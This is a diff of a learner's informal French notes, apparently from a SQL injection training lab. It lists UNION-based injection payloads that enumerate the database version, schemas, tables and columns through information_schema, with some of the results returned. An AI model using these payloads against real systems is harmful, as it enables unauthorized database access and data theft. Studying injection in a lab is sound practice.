@@ -23,12 +23,24 @@ https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
  ## 0 UNION ALL SELECT NULL,version()-- 
 c est top ca renvoi la version qui est : 5.5.64-MariaDB-1ubuntu0.14.04.1
  ## 0 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
-me donne les titre des colonnes
+me donne les nom de database suivant :
 - information_schema
 - Member_Brute_Force
 - Member_Sql_Injection
 - Member_guestbook
 - Member_images
 - Member_survey
+
+0 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM images.TABLES --
+
+je ne comprend pas les member machin ils ne retourne rien
 ## 0 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES --
 je recupere plein de truc mais je ne sait pas quoi en faire
+
+USER_STATISTICS
+
+ 0 UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='USER_STATISTICS'--
+
+## 0 UNION ALL SELECT NULL,concat(column_name) FROM guestbook.COLUMNS --
+me donne toute les columns existante
+
